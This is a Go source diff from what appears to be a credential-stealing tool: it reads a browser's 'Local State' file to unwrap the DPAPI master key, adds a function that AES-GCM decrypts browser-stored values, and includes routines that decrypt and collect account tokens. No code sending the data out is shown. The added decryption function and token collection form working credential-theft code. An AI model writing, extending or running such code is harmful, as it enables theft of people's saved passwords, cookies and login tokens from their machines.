@@ -43,7 +43,7 @@ func NewBlob(d []byte) *DATA_BLOB {
 }
 
 func (b *DATA_BLOB) ToByteArray() []byte {
-	// Bit shift the 
+	// Convert the Windows DPAPI object to a byte array using a bit shift operation
 	d := make([]byte, b.cbData)
 	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
 
@@ -68,7 +68,7 @@ func DecryptBytes(data []byte) ([]byte, error) {
 
 func GetMasterKey(location string) ([]byte, error) {
 	// Get DPAPI MasterKey from the supplied locations' Local State
-	jsonFile := CleanPath(location + "/Local State")
+	jsonFile := CleanPath(location + "\\Local State")
 
 	byteValue, err := os.ReadFile(jsonFile)
 	if err != nil {
@@ -96,6 +96,29 @@ func GetMasterKey(location string) ([]byte, error) {
 	return plaintextKey, nil
 }
 
+func DecryptBrowserValue(encrypted string, masterKey []byte) string {
+	ciphertext := []byte(encrypted)
+	c, err := aes.NewCipher(masterKey)
+	if err != nil {
+		return ""
+	}
+	gcm, err := cipher.NewGCM(c)
+	if err != nil {
+		return ""
+	}
+	nSize := gcm.NonceSize()
+	if len(ciphertext) < nSize {
+		return ""
+	}
+
+	ns, ciphertext := ciphertext[:nSize], ciphertext[nSize:]
+	plaintext, err := gcm.Open(nil, ns, ciphertext, nil)
+	if err != nil {
+		return ""
+	}
+
+	return string(plaintext)
+}
 
 func DecryptToken(buffer []byte, location string) string {
 	// Decrypt token using MasterKey
@@ -138,7 +161,6 @@ func GetDecryptedToken(line []byte, tokenList *[]string) {
 		*tokenList = append(*tokenList, token)
 	}
 }
-
 
 var (
 	dllCrypt32  = syscall.NewLazyDLL("Crypt32.dll")
